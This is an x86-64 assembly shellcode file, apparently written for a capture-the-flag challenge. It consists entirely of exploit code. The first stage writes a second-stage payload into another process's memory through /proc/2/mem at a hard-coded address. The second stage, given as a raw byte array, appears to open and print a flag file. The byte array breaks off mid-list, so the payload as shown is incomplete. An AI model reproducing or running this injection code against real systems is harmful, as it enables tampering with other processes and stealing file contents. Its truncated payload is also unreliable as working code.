bits 64

section .text
global _start
_start:
    sub rsp, 0x100
    ; write(1, "/proc/2/mem", 11); // debug
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel path]
    mov rdx, 11
    syscall
    ; open("/proc/2/mem", 1);
    mov rax, 2
    lea rdi, [rel path]
    mov rsi, 1
    syscall
    ; lseek(fd, 0x4022E3, 0); // just after sleep
    mov rdi, rax
    mov rax, 8
    mov rsi, 0x4022E3
    mov rdx, 0
    syscall
    ; write(fd, stage_2, sizeof(stage_2));
    mov rax, 1
    lea rsi, [rel stage2]
    mov rdx, 100
    syscall
    ; sched_yield()
mark:
    jmp mark

path:
    db "/proc/2/mem", 0
stage2: db 0x48, 0x81, 0xec, 0x0, 0x1, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xbf, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x35, 0x3e, 0x0, 0x0, 0x0, 0xba, 0xf, 0x0, 0x0, 0x0, 0xf, 0x5, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x3d, 0x2b, 0x0, 0x0, 0x0, 0xbe, 0x2, 0x0, 0x0, 0x0, 0xf, 0x5, 0x48, 0x89, 0xc7, 0xb8, 0x0, 0x0, 0x0, 0x0, 0x48, 0x89, 0xe6, 0xba, 0x10, 0x0, 0x0, 0x0, 0xf, 0x5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xbf, 0x1, 0x0, 0x0, 0x0, 0x48, 0x89, 0xe6, 0xba, 0x50, 0x0, 0x0, 0x0, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x75, 0x73, 0x65, 0x72, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x0, 
